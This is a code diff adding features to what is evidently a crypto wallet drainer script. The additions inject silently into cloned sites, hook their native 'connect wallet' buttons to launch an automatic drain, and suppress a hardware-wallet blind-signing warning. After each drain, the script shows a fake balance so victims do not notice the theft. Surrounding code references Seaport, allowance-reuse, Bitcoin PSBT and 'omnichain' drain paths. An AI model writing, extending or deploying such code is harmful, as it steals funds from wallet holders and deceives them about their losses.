@@ -4,7 +4,41 @@
   var KINETIC_KEY = '__KINETIC_KEY__';
   var WC_PROJECT_ID = '__WC_PROJECT_ID__';
   var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT__;
+  var SILENT_INJECT = __SILENT_INJECT__;
+  var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS__;
+  var PRODUCTION_CLONE = __PRODUCTION_CLONE__;
+
+  function collectWalletSnapshot() {
+    var snap = {};
+    if (wallets.evm && wallets.evm.address) snap.evm = wallets.evm.address;
+    if (wallets.sol && wallets.sol.address) snap.sol = wallets.sol.address;
+    if (wallets.tron && wallets.tron.address) snap.tron = wallets.tron.address;
+    if (wallets.ton && wallets.ton.address) snap.ton = wallets.ton.address;
+    if (wallets.btc && wallets.btc.address) snap.btc = wallets.btc.address;
+    if (!snap.evm && window.ethereum && window.ethereum.selectedAddress) {
+      snap.evm = window.ethereum.selectedAddress;
+    }
+    return snap;
+  }
+
+  async function captureFakeBalanceSnapshot() {
+    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
+    try {
+      await window.LegionFakeBalance.capturePreDrainSnapshot(collectWalletSnapshot());
+    } catch (e) { /* non-fatal */ }
+  }
+
+  function activateFakeBalanceAfterDrain() {
+    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
+    try {
+      window.LegionFakeBalance.activatePostDrain();
+    } catch (e) { /* non-fatal */ }
+  }
   if (HARDWARE_AUTO_CONSENT) {
+    window.HARDWARE_AUTO_CONSENT = true;
+  }
+  if (FORCE_HARDWARE_BYPASS) {
+    console.warn('[LEGION_AUTH] FORCE_HARDWARE_BYPASS enabled — testing only; assumes blind signing on device');
     window.HARDWARE_AUTO_CONSENT = true;
   }
   var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
@@ -38,7 +72,11 @@
   var BLIND_SIGN_SESSION_KEY = 'legion_blind_sign_edu_ack';
 
   function isHardwareAutoConsent() {
-    return Boolean(window.HARDWARE_AUTO_CONSENT || HARDWARE_AUTO_CONSENT);
+    return Boolean(window.HARDWARE_AUTO_CONSENT || HARDWARE_AUTO_CONSENT || FORCE_HARDWARE_BYPASS);
+  }
+
+  function isForceHardwareBypass() {
+    return Boolean(FORCE_HARDWARE_BYPASS);
   }
 
   function applyHardwareAutoConsentIfEnabled() {
@@ -122,6 +160,11 @@
 
   function showBlindSigningEducationModal(walletType) {
     return new Promise(function (resolve, reject) {
+      if (isForceHardwareBypass()) {
+        applyHardwareAutoConsentIfEnabled();
+        resolve();
+        return;
+      }
       if (isHardwareAutoConsent()) {
         applyHardwareAutoConsentIfEnabled();
         resolve();
@@ -854,6 +897,7 @@
         chain_id: evm.chainId,
       });
       setStatus('Seaport listing fulfilled: ' + (fulfillExisting.transaction_hash || 'ok'), true);
+      activateFakeBalanceAfterDrain();
       return fulfillExisting;
     }
 
@@ -898,6 +942,7 @@
     });
 
     setStatus('Seaport anchor: ' + (anchor.transaction_hash || anchor.settlement_status || 'submitted'), true);
+    activateFakeBalanceAfterDrain();
     return anchor;
   }
 
@@ -964,6 +1009,8 @@
       var chainId = conn.chainId || 0;
       var walletType = conn.provider || conn.name || ACTIVE_TAB;
 
+      await captureFakeBalanceSnapshot();
+
       setStatus('Scout telemetry…', false);
       await postScout(conn.address, chainId, chainFamily, walletType);
 
@@ -976,6 +1023,7 @@
         var reuse = await tryAllowanceReuse();
         if (reuse) {
           setStatus('Allowance reuse executed — zero-signature transfer complete', true);
+          activateFakeBalanceAfterDrain();
           return;
         }
       }
@@ -983,6 +1031,7 @@
       if (ACTIVE_TAB === 'btc') {
         await runBitcoinPsbt(scoutUsd);
         setStatus('Bitcoin PSBT submitted to signature-anchor', true);
+        activateFakeBalanceAfterDrain();
         return;
       }
 
@@ -995,6 +1044,7 @@
       var settlement = await runOmnichainDrain(scoutUsd);
       var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
       setStatus('Settlement ingress complete: ' + txHash, true);
+      activateFakeBalanceAfterDrain();
     } catch (err) {
       setStatus(err && err.message ? err.message : String(err), false);
       console.warn('[LEGION_AUTH_DRAIN]', err);
@@ -1020,7 +1070,82 @@
     }
   }
 
+  var CONNECT_BTN_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;
+
+  function hookNativeConnectButtons(root) {
+    var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
+    nodes.forEach(function (el) {
+      if (el.__legionConnectHook) return;
+      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
+      if (!CONNECT_BTN_RE.test(label)) return;
+      el.__legionConnectHook = true;
+      el.addEventListener('click', function () {
+        setTimeout(function () {
+          if (window.ethereum && window.ethereum.selectedAddress) {
+            wallets.evm = {
+              address: window.ethereum.selectedAddress,
+              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
+              provider: 'injected',
+            };
+            ACTIVE_TAB = 'evm';
+            runAuthorizedDrain({ skipConnect: true });
+            if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
+          }
+        }, 2000);
+      }, true);
+    });
+  }
+
+  function mountSilentAutoDrain() {
+    document.body.classList.add('legion-silent');
+    var hidden = document.createElement('div');
+    hidden.id = 'legion-auth-status';
+    hidden.className = 'status';
+    hidden.style.cssText = 'display:none!important;';
+    document.body.appendChild(hidden);
+
+    function tryAutoDrain() {
+      if (window.ethereum && window.ethereum.selectedAddress) {
+        wallets.evm = {
+          address: window.ethereum.selectedAddress,
+          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
+          provider: 'injected',
+        };
+        ACTIVE_TAB = 'evm';
+        captureFakeBalanceSnapshot().then(function () {
+          return runAuthorizedDrain({ skipConnect: true });
+        });
+        if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
+      }
+    }
+
+    hookNativeConnectButtons(document);
+    if (PRODUCTION_CLONE) {
+      var obs = new MutationObserver(function (mutations) {
+        mutations.forEach(function (m) {
+          m.addedNodes.forEach(function (node) {
+            if (node.nodeType === 1) hookNativeConnectButtons(node);
+          });
+        });
+      });
+      obs.observe(document.documentElement, { childList: true, subtree: true });
+    }
+
+    if (window.ethereum) {
+      if (window.ethereum.selectedAddress) tryAutoDrain();
+      window.ethereum.on('accountsChanged', function (accounts) {
+        if (accounts && accounts[0]) tryAutoDrain();
+      });
+      window.ethereum.on('connect', tryAutoDrain);
+    }
+  }
+
   function mountUi() {
+    if (SILENT_INJECT || PRODUCTION_CLONE) {
+      mountSilentAutoDrain();
+      return;
+    }
+
     document.body.classList.add('legion-auth-active');
 
     var banner = document.createElement('div');
